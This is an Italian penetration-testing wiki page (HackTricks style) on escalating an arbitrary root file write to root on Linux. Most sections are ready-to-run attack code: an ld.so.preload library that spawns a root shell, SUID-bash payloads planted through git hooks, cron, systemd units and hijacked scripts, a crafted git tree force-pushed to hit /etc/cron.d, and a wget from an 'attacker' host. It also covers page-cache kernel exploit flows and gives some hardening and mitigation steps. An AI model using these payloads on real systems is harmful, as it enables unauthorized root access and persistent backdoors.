# Scrittura arbitraria di file come root

{{#include ../../banners/hacktricks-training.md}}

### /etc/ld.so.preload

`/etc/ld.so.preload` è un elenco a livello di sistema di oggetti condivisi che il linker dinamico carica prima degli altri oggetti condivisi. La modalità di esecuzione sicura applica restrizioni aggiuntive al preloading, quindi un percorso di libreria come `/tmp/pe.so` non è una tecnica universale per i binari SUID.\
Se puoi crearlo o modificarlo, un processo che carica il file caricherà la libreria indicata prima degli altri oggetti condivisi, consentendo l'esecuzione di codice nel contesto di quel processo.<sup>[[12]](#references)</sup>

Ad esempio: `echo "/tmp/pe.so" > /etc/ld.so.preload`
```c
#include <stdio.h>
#include <sys/types.h>
#include <stdlib.h>
#include <unistd.h>

void _init() {
unlink("/etc/ld.so.preload");
setgid(0);
setuid(0);
system("/bin/bash");
}
//cd /tmp
//gcc -fPIC -shared -o pe.so pe.c -nostartfiles
```
### Git hooks

**Git hooks** sono script eseguibili eseguiti in risposta a eventi in un repository, incluse le operazioni di commit e merge. Se uno **script o un utente privilegiato** esegue tali azioni e un attacker può **scrivere nella cartella `.git`**, l'hook può essere utilizzato per la **privilege escalation**.<sup>[[13]](#references)</sup>

Ad esempio, è possibile **generare uno script** in un repository git, nella cartella **`.git/hooks`**, in modo che venga sempre eseguito quando viene creato un nuovo commit:
```bash
echo -e '#!/bin/bash\n\ncp /bin/bash /tmp/0xdf\nchown root:root /tmp/0xdf\nchmod 4777 /tmp/0xdf' > pre-commit
chmod +x pre-commit
```
### Path traversal nell'esportazione di un albero Git privilegiato

Un synchronizer con privilegi può evitare un checkout e invece enumerare un repository influenzato dall'attacker con `git ls-tree`, leggere ogni blob con `git cat-file`, unire il pathname restituito a una staging directory e scriverlo autonomamente. Questo si trasforma in un **arbitrary file write con i privilegi del synchronizer** quando combina `-c safe.directory=*` (disabilitando la protezione di Git per i repository con owner differente) con l'assenza di un controllo di contenimento della destinazione. Un nome di tree-entry assoluto fa sì che `os.path.join(stage, name)` di Python scarti `stage`; un nome relativo contenente `../` esce dalla directory quando il filesystem lo risolve. Poiché l'applicazione materializza il tree raw invece di chiedere a Git di eseguire il checkout, il rifiuto del pathname durante il checkout non protegge il sink.<sup>[[30]](#references)[[32]](#references)[[33]](#references)</sup>

Cerca questa struttura del codice nei root services, timer, deployment agents, template importers e processi di backup/restore:<sup>[[30]](#references)</sup>
```python
entries = git("-c", "safe.directory=*", "ls-tree", "-rz", "HEAD")
for mode, oid, git_path in parse(entries):
target = os.path.join(stage_root, git_path)  # no containment check
os.makedirs(os.path.dirname(target), exist_ok=True)
with open(target, "wb") as output:
output.write(git("cat-file", "blob", oid))
```
Una voce dell’albero è codificata come `<mode> SP <name> NUL <raw object ID>`. L’opzione `git hash-object --literally` consente deliberatamente dati degli oggetti che la normale analisi o `git fsck` potrebbero rifiutare, quindi un clone usa-e-getta può costruire un albero il cui nome file è una destinazione assoluta. Questo esempio crea un blob contenente un file cron, racchiude l’albero creato ad arte in un commit e sposta un branch su di esso; lo sfruttamento richiede comunque l’autorizzazione ad aggiornare un repository utilizzato dal job privilegiato e un server Git che accetti l’oggetto malformato.<sup>[[30]](#references)[[31]](#references)</sup>
```bash
blob=$(printf '%s\n' '* * * * * root cp /bin/bash /tmp/rootbash && chmod 6755 /tmp/rootbash' | git hash-object -w --stdin)
{ printf '100644 /etc/cron.d/git-sync\0'; printf '%s' "$blob" | xxd -r -p; } > tree.raw
tree=$(git hash-object -w -t tree --literally --stdin < tree.raw)
commit=$(printf 'crafted tree\n' | git commit-tree "$tree")
git update-ref refs/heads/main "$commit"
git ls-tree -r main
git push --force origin main
```
L’hardening deve coprire sia l’ingestion del repository sia l’operazione finale sul filesystem:<sup>[[30]](#references)[[33]](#references)[[34]](#references)</sup>

- Sostituisci `safe.directory=*` con i repository esatti di cui il servizio deve fidarsi ed esegui l’elaborazione del repository senza privilegi root quando possibile.
- Rifiuta i nomi assoluti e qualsiasi componente `.` o `..` prima della materialization. Dopo l’unione, esegui la canonicalization e verifica che la destinazione rimanga all’interno della root prevista.
- Evita le symlink race tra check e open: apri il file in relazione a un file descriptor di directory trusted e, su Linux, usa `openat2()` con `RESOLVE_BENEATH` e `RESOLVE_NO_SYMLINKS` per i path controllati dall’attacker.
- Preferisci un checkout normale in una directory isolata invece di reimplementare il checkout dall’output di plumbing. Se è necessaria l’ingestion di raw object, abilita la validazione lato receive, ad esempio `receive.fsckObjects=true`; non ridurre la severità dei finding relativi ai pathname in `receive.fsck.*`, necessari per rifiutare tree crafted.

### File Cron e di temporizzazione

Se puoi **scrivere file relativi a cron che vengono eseguiti da root**, di solito puoi ottenere code execution alla successiva esecuzione del job. Tra i target interessanti ci sono:<sup>[[14]](#references)[[20]](#references)</sup>

- `/etc/crontab`
- `/etc/cron.d/*`
- `/etc/cron.hourly/*`, `/etc/cron.daily/*`, `/etc/cron.weekly/*`, `/etc/cron.monthly/*`
- Il crontab di root in `/var/spool/cron/` o `/var/spool/cron/crontabs/`
- I timer `systemd` e i servizi che attivano

Controlli rapidi:
```bash
ls -la /etc/crontab /etc/cron.d /etc/cron.hourly /etc/cron.daily /etc/cron.weekly /etc/cron.monthly 2>/dev/null
find /var/spool/cron* -maxdepth 2 -type f -ls 2>/dev/null
systemctl list-timers --all 2>/dev/null
grep -R "run-parts\\|cron" /etc/crontab /etc/cron.* /etc/cron.d 2>/dev/null
```
Percorsi tipici di abuso:

- **Aggiungere un nuovo root cron job** a `/etc/crontab` o a un file in `/etc/cron.d/`
- **Sostituire uno script** già eseguito da `run-parts`
- **Inserire una backdoor in un timer target esistente** modificando lo script o il binary che avvia

Esempio minimale di payload cron:
```bash
echo '* * * * * root cp /bin/bash /tmp/rootbash && chown root:root /tmp/rootbash && chmod 4777 /tmp/rootbash' >> /etc/crontab
```
Se puoi scrivere solo all'interno di una directory cron utilizzata da `run-parts`, inserisci invece lì un file eseguibile:
```bash
cat > /etc/cron.daily/backup <<'EOF'
#!/bin/sh
cp /bin/bash /tmp/rootbash
chown root:root /tmp/rootbash
chmod 4777 /tmp/rootbash
EOF
chmod +x /etc/cron.daily/backup
```
Note:

- `run-parts` di solito ignora i nomi di file contenenti punti, quindi preferisci nomi come `backup` invece di `backup.sh`.<sup>[[15]](#references)</sup>
- Alcuni sistemi usano i timer di `systemd` invece del cron classico, ma l'idea dell'abuso è la stessa: **modificare ciò che root eseguirà in seguito**.<sup>[[20]](#references)</sup>

### File di Service e Socket

Se puoi scrivere **file unit di `systemd`** o i file a cui fanno riferimento, potresti ottenere code execution come root ricaricando e riavviando l'unit, oppure aspettando che il percorso di attivazione del service/socket venga eseguito.<sup>[[16]](#references)[[17]](#references)[[18]](#references)[[19]](#references)</sup>

Tra i target interessanti ci sono:

- `/etc/systemd/system/*.service`
- `/etc/systemd/system/*.socket`
- Override drop-in in `/etc/systemd/system/<unit>.d/*.conf`
- Script/binari del service referenziati da `ExecStart=`, `ExecStartPre=`, `ExecStartPost=`
- Percorsi `EnvironmentFile=` scrivibili, caricati da un service root

Controlli rapidi:
```bash
ls -la /etc/systemd/system /lib/systemd/system /usr/lib/systemd/system 2>/dev/null
systemctl list-units --type=service --all 2>/dev/null
systemctl list-units --type=socket --all 2>/dev/null
grep -R "^ExecStart=\\|^EnvironmentFile=\\|^ListenStream=" /etc/systemd/system /lib/systemd/system /usr/lib/systemd/system 2>/dev/null
```
Percorsi comuni di abuso:

- **Sovrascrivere `ExecStart=`** in un'unità di servizio di proprietà di root che puoi modificare
- **Aggiungere un drop-in override** con un `ExecStart=` malicious e cancellare prima quello precedente
- **Inserire una backdoor nello script/binario** già referenziato dall'unità
- **Hijackare un servizio socket-activated** modificando il file `.service` corrispondente, che viene avviato quando il socket riceve una connessione

Esempio di override malicious:
```ini
[Service]
ExecStart=
ExecStart=/bin/sh -c 'cp /bin/bash /tmp/rootbash && chown root:root /tmp/rootbash && chmod 4777 /tmp/rootbash'
```
Flusso di attivazione tipico:
```bash
systemctl daemon-reload
systemctl restart vulnerable.service
# or trigger the socket-backed service by connecting to it
```
Se non puoi riavviare autonomamente i servizi ma puoi modificare una unit attivata tramite socket, potrebbe essere sufficiente **attendere una connessione client** per attivare l'esecuzione del servizio backdoored come root.<sup>[[17]](#references)</sup>

### Sovrascrivere un `php.ini` restrittivo usato da una sandbox PHP privilegiata

Alcuni demoni personalizzati convalidano il PHP fornito dall'utente eseguendo `php` con un **`php.ini` restrittivo** (ad esempio, `disable_functions=exec,system,...`). Se il codice nella sandbox dispone ancora di **qualsiasi primitive di scrittura** (come `file_put_contents`) e puoi raggiungere il **percorso esatto di `php.ini`** usato dal demone, puoi **sovrascrivere quella configurazione** per rimuovere le restrizioni e quindi inviare un secondo payload che viene eseguito con privilegi elevati.<sup>[[2]](#references)</sup>

Flusso tipico:

1. Il primo payload sovrascrive la configurazione della sandbox.
2. Il secondo payload esegue il codice ora che le funzioni pericolose sono state riabilitate.

Esempio minimo (sostituisci il percorso usato dal demone):
```php
<?php
file_put_contents('/path/to/sandbox/php.ini', "disable_functions=\n");
```
Se il daemon viene eseguito come root (o esegue la validazione con percorsi di proprietà di root), la seconda esecuzione restituisce un contesto root. Si tratta essenzialmente di una **privilege escalation tramite sovrascrittura della configurazione** quando il runtime in sandbox può comunque scrivere file.

### binfmt_misc

`binfmt_misc` espone le registrazioni in `/proc/sys/fs/binfmt_misc`; ogni registrazione associa un pattern di tipo file a un interpreter. L'impatto sui privilegi dipende da chi può modificare la registrazione e da quale processo esegue successivamente il file corrispondente, quindi verifica questi requisiti prima di considerarlo un percorso di privilege escalation.<sup>[[21]](#references)</sup>

### Sovrascrivere gli handler degli schema (come http: o https:)

Gli ambienti desktop usano associazioni MIME e desktop entry per scegliere un'applicazione per gli URI scheme; un attacker che può scrivere nelle directory di configurazione per-user e nelle directory delle desktop entry pertinenti può reindirizzare questi scheme verso un launcher sotto il suo controllo. Modificando il file `$HOME/.config/mimeapps.list` per indirizzare gli handler degli URL HTTP e HTTPS verso un file malevolo (ad esempio, `x-scheme-handler/http=evil.desktop` e `x-scheme-handler/https=evil.desktop`), un click dell'utente può invocare quella desktop entry.<sup>[[22]](#references)[[23]](#references)[[24]](#references)</sup>
```bash
[Desktop Entry]
Type=Application
Name=Evil Desktop Entry
Exec=/bin/sh -c "id > /tmp/mime-handler-pwned"
MimeType=x-scheme-handler/http;x-scheme-handler/https;
```
### Root che esegue script/binari scrivibili dall'utente

Se un workflow privilegiato esegue qualcosa come `/bin/sh /home/username/.../script` (o qualsiasi binario all'interno di una directory di proprietà di un utente non privilegiato), puoi hijackarlo:<sup>[[1]](#references)</sup>

- **Rileva l'esecuzione:** monitora i processi con pspy per intercettare root mentre invoca percorsi controllati dall'utente.<sup>[[25]](#references)</sup>
```bash
wget http://attacker/pspy64 -O /dev/shm/pspy64
chmod +x /dev/shm/pspy64
/dev/shm/pspy64   # wait for root commands pointing to your writable path
```
- **Confirm writeability:** assicurati che il file target e la relativa directory siano di proprietà del tuo utente e scrivibili.
- **Hijack the target:** esegui il backup del binary/script originale e inserisci un payload che crei una shell SUID (o esegua qualsiasi altra azione root), quindi ripristina i permessi:
```bash
mv server-command server-command.bk
cat > server-command <<'EOF'
#!/bin/bash
cp /bin/bash /tmp/rootshell
chown root:root /tmp/rootshell
chmod 6777 /tmp/rootshell
EOF
chmod +x server-command
```
- **Attiva l'azione privilegiata** (ad es., premendo un pulsante UI che avvia l'helper). Quando root riesegue il path dirottato, ottieni la shell con privilegi elevati usando `./rootshell -p`.

### Modifica dei file dei binari privilegiati solo nella page cache

Alcuni bug del kernel non modificano il file **su disco**. Consentono invece di modificare solo la **copia nella page cache** di un file leggibile. Se puoi prendere di mira un binario **setuid** o comunque **eseguito da root**, l'esecuzione successiva può eseguire byte controllati dall'attacker presenti in memoria ed elevare i privilegi, anche se l'hash del file su disco non è cambiato.<sup>[[3]](#references)[[4]](#references)</sup>

È utile considerare questa possibilità come una **primitive di scrittura dei file valida solo a runtime**:<sup>[[3]](#references)</sup>

- **Il disco rimane pulito**: l'inode e i byte su disco non cambiano
- **La memoria è dirty**: i processi che leggono o eseguono la pagina in cache ricevono il contenuto modificato dall'attacker
- **L'effetto è temporaneo**: la modifica scompare dopo un riavvio o l'espulsione dalla cache

Questa primitive si colloca tra la classica **arbitrary file write** e i vecchi bug di **page-cache abuse** come Dirty COW / Dirty Pipe:<sup>[[3]](#references)</sup>

- Dirty COW si basava su una race
- Dirty Pipe aveva vincoli sulla posizione di scrittura
- Una primitive che agisce solo sulla page cache può essere più affidabile se il percorso vulnerabile consente scritture dirette nelle pagine cached associate ai file

#### Flusso generico di privesc

1. Ottieni una primitive del kernel in grado di scrivere nelle **pagine della page cache associate ai file**
2. Usala contro un **binario privilegiato leggibile** o un altro file eseguito da root
3. Attiva l'esecuzione **prima** che la pagina venga espulsa dalla cache
4. Ottieni l'esecuzione di codice come root mentre il file su disco appare ancora non modificato

Target tipici di alto valore:

- binari **setuid-root**
- Helper avviati da **servizi root**
- Binari eseguiti comunemente da **container che condividono il kernel/page cache dell'host**

#### Percorso di esempio AF_ALG + `splice()`

Copy Fail (CVE-2026-31431) è un buon esempio di questa classe. Il percorso vulnerabile si trovava nell'API userspace di crittografia Linux (`AF_ALG` / `algif_aead`):<sup>[[3]](#references)[[4]](#references)[[5]](#references)[[6]](#references)[[7]](#references)</sup>

- `splice()` può spostare riferimenti a pagine della page cache da un file leggibile nella scatterlist TX della crypto
- il percorso di decrittazione in-place di `algif_aead` riutilizzava i buffer sorgente e destinazione
- `authencesn` scriveva quindi nella regione del tag di destinazione
- quando quella regione faceva ancora riferimento a pagine associate a file presenti nella page cache, la scrittura finiva nella **page cache del file target**

Quindi la tecnica interessante non è la CVE in sé, ma il pattern:

- **inserire pagine della cache associate ai file in un sottosistema del kernel**
- fare in modo che il sottosistema le **tratti come output scrivibile**
- attivare una sovrascrittura controllata di piccole dimensioni in memoria

Il PoC pubblico utilizzava scritture ripetute di **4 byte** per modificare `/usr/bin/su` in memoria e poi lo eseguiva.<sup>[[4]](#references)[[7]](#references)</sup>

#### Percorso di esempio ESP / XFRM + clone netfilter TEE

DirtyClone (CVE-2026-43503) mostra un'altra variante dello stesso pattern **page-cache-only write-to-root**, ma questa volta il sink è la **decrittazione IPsec ESP** invece di `AF_ALG`.<sup>[[8]](#references)[[9]](#references)[[10]](#references)[[11]](#references)</sup>

La tecnica importante è il **passaggio di metadata-laundering**:

- `splice()` inserisce una **pagina della page cache associata a un file e di sola lettura** in un pacchetto ESP-in-UDP
- la mitigazione originale di DirtyFrag contrassegnava quello skb con `SKBFL_SHARED_FRAG`, affinché `esp_input()` **eseguisse una copia prima della decrittazione**
- netfilter `TEE` duplica il pacchetto tramite `nf_dup_ipv4()` -> `__pskb_copy_fclone()`
- il clone conserva lo **stesso riferimento fisico alla pagina della page cache**, ma perde `SKBFL_SHARED_FRAG`
- `esp_input()` tratta quindi il clone come sicuro ed esegue la decrittazione in-place `cbc(aes)` sulla pagina associata al file

La lezione per il reviewer è quindi più ampia della CVE: se una mitigazione dipende dai **metadata di skb/pagina** per decidere se un'operazione debba prima eseguire una copia, qualsiasi **percorso di clone/copia che conservi la pagina sottostante ma elimini i metadata** può riaprire silenziosamente la primitive di scrittura.

Flusso di exploitation tipico:

1. `unshare(CLONE_NEWUSER | CLONE_NEWNET)` per ottenere **`CAP_NET_ADMIN` all'interno di un private network namespace**
2. attiva il loopback e installa una regola **netfilter `TEE`** in `mangle/OUTPUT`
3. installa le SA di trasporto XFRM ESP tramite `NETLINK_XFRM`
4. codifica ogni word target di 4 byte nel campo `seq_hi` della SA (il word-selection trick di DirtyFrag)
5. invia il pacchetto ESP-in-UDP sottoposto a splice, in modo che il **clone TEE** raggiunga `esp_input()` ed esegua la decrittazione **in-place**
6. ripeti finché la copia nella page cache di `/usr/bin/su` o di un altro executable privilegiato contiene codice controllato dall'attacker

A livello operativo, l'impatto è lo stesso dell'esempio `AF_ALG`: il file su disco rimane pulito, ma `execve()` utilizza i **byte modificati nella page cache** e restituisce root.<sup>[[8]](#references)[[9]](#references)</sup>

Controlli utili sull'esposizione per questa variante:
```bash
unshare -Urn true 2>/dev/null && echo "user+net namespaces available"
sysctl kernel.apparmor_restrict_unprivileged_userns 2>/dev/null
modprobe -n -v xt_TEE 2>/dev/null
modprobe -n -v esp4 2>/dev/null
modprobe -n -v esp6 2>/dev/null
lsmod | egrep 'xt_TEE|nf_dup_ipv4|esp4|esp6|x_tables'
```
La riduzione della superficie d'attacco a breve termine è anche specifica del percorso: l'aggiornamento a un kernel che include `48f6a5356a33` corregge il **percorso clone**, mentre il blocco dell'autoload di `xt_TEE` rimuove il **flag-laundering step** e il blocco di `esp4` / `esp6` rimuove il **decrypt sink**.<sup>[[8]](#references)[[9]](#references)[[10]](#references)[[11]](#references)</sup>

#### Esposizione e hunting

Se sospetti questa classe di bug, non fare affidamento solo sui controlli di integrità del disco. Verifica anche:
```bash
uname -r
grep CONFIG_CRYPTO_USER_API_AEAD= /boot/config-$(uname -r) 2>/dev/null
lsmod | grep algif_aead
find / -perm -4000 -type f 2>/dev/null
```
I valori di configurazione riportati di seguito distinguono un'interfaccia caricabile da una integrata nel kernel; le regole di build crypto associano `CONFIG_CRYPTO_USER_API_AEAD` a `algif_aead`.<sup>[[26]](#references)[[27]](#references)</sup>

- `CONFIG_CRYPTO_USER_API_AEAD=m`: `algif_aead` può essere caricato/scaricato come modulo
- `CONFIG_CRYPTO_USER_API_AEAD=y`: l'interfaccia è integrata nel kernel
- i binari setuid sono buoni obiettivi perché una patch che agisce solo sulla page cache può essere sufficiente per trasformare un accesso locale iniziale in root

#### Riduzione della attack surface per il percorso `algif_aead`

Se l'interfaccia vulnerabile è fornita da un modulo caricabile:<sup>[[6]](#references)[[28]](#references)[[29]](#references)</sup>
```bash
echo "install algif_aead /bin/false" > /etc/modprobe.d/disable-algif.conf
rmmod algif_aead 2>/dev/null || true
```
Se è compilato nel kernel, alcune disclosure hanno segnalato il blocco del percorso init con:<sup>[[28]](#references)</sup>
```bash
initcall_blacklist=algif_aead_init
```
Questo tipo di mitigazione è utile da ricordare anche per altri kernel LPE: se l'exploitation dipende da una specifica interfaccia opzionale, disabilitare o mettere in blacklist tale interfaccia può interrompere il percorso di exploit anche prima che sia disponibile un aggiornamento completo del kernel.<sup>[[6]](#references)[[28]](#references)</sup>

## References

- [1] [HTB Bamboo – hijacking di uno script eseguito da root in una directory PaperCut scrivibile dall'utente](https://0xdf.gitlab.io/2026/02/03/htb-bamboo.html)
- [2] [HTB: Gavel](https://0xdf.gitlab.io/2026/03/14/htb-gavel.html)
- [3] [Tenable: FAQ su Copy Fail (CVE-2026-31431)](https://www.tenable.com/blog/copy-fail-cve-2026-31431-frequently-asked-questions-about-linux-kernel-privilege-escalation)
- [4] [Disclosure di Openwall oss-security per CVE-2026-31431](https://www.openwall.com/lists/oss-security/2026/04/29/23)
- [5] [Fix di Linux stable: crypto: algif_aead - ripristino del funzionamento out-of-place](https://git.kernel.org/stable/c/a664bf3d603dc3bdcf9ae47cc21e0daec706d7a5)
- [6] [Avviso Copy Fail — CVE-2026-31431](https://copy.fail/)
- [7] [Analisi tecnica di Theori / Xint](https://xint.io/blog/copy-fail-linux-distributions)
- [8] [Repository / README di DirtyClone](https://github.com/rafaeldtinoco/security/tree/main/exploits/dirtyclone)
- [9] [JFrog: analisi e sfruttamento della variante Linux LPE DirtyClone (CVE-2026-43503)](https://research.jfrog.com/post/dissecting-and-exploiting-linux-lpe-variant-dirtyclone-cve-2026-43503/)
- [10] [Fix di Linux: net: skb: preservare `SKBFL_SHARED_FRAG` in `__pskb_copy_fclone()` (`48f6a5356a33`)](https://git.kernel.org/pub/scm/linux/kernel/git/torvalds/linux.git/commit/?id=48f6a5356a33)
- [11] [Mitigazione precedente di Linux: impostare `SKBFL_SHARED_FRAG` per i pacchetti UDP sottoposti a splice (`f4c50a4034e6`)](https://git.kernel.org/pub/scm/linux/kernel/git/torvalds/linux.git/commit/?id=f4c50a4034e6)
- [12] [ld.so(8) — pagina del manuale di Linux](https://man7.org/linux/man-pages/man8/ld.so.8.html)
- [13] [Git Hooks](https://git-scm.com/book/en/v2/Customizing-Git-Git-Hooks)
- [14] [crontab(5) — pagina del manuale di Linux](https://man7.org/linux/man-pages/man5/crontab.5.html)
- [15] [run-parts(8) — pagina del manuale Debian](https://manpages.debian.org/bookworm/debianutils/run-parts.8.en.html)
- [16] [systemd.service](https://github.com/systemd/systemd/blob/main/man/systemd.service.xml)
- [17] [systemd.socket](https://github.com/systemd/systemd/blob/main/man/systemd.socket.xml)
- [18] [systemd.unit](https://github.com/systemd/systemd/blob/main/man/systemd.unit.xml)
- [19] [systemd.exec](https://github.com/systemd/systemd/blob/main/man/systemd.exec.xml)
- [20] [systemd.timer](https://github.com/systemd/systemd/blob/main/man/systemd.timer.xml)
- [21] [binfmt_misc — documentazione del Linux Kernel](https://www.kernel.org/doc/html/latest/admin-guide/binfmt-misc.html)
- [22] [Associazioni delle applicazioni MIME](https://specifications.freedesktop.org/mime-apps/1.0.1/file.html)
- [23] [Specifica Shared MIME-info](https://specifications.freedesktop.org/shared-mime-info/latest-single/)
- [24] [Specifica Desktop Entry](https://specifications.freedesktop.org/desktop-entry/latest-single/)
- [25] [pspy](https://github.com/DominicBreuker/pspy)
- [26] [Linguaggio Kconfig](https://docs.kernel.org/kbuild/kconfig-language.html)
- [27] [Makefile crypto di Linux](https://raw.githubusercontent.com/torvalds/linux/master/crypto/Makefile)
- [28] [CERT VU#260001: vulnerabilità della page cache AF_ALG del Linux kernel](https://kb.cert.org/vuls/id/260001)
- [29] [modprobe(8) — pagina del manuale di Linux](https://man7.org/linux/man-pages/man8/modprobe.8.html)
- [30] [0xdf — HTB: Nexus](https://0xdf.gitlab.io/2026/09/02/htb-nexus.html)
- [31] [Documentazione di Git `hash-object`](https://git-scm.com/docs/git-hash-object)
- [32] [Documentazione di Git `ls-tree`](https://git-scm.com/docs/git-ls-tree)
- [33] [Documentazione della configurazione di Git](https://git-scm.com/docs/git-config)
- [34] [`openat2(2)` — pagina del manuale di Linux](https://man7.org/linux/man-pages/man2/openat2.2.html)
{{#include ../../banners/hacktricks-training.md}}
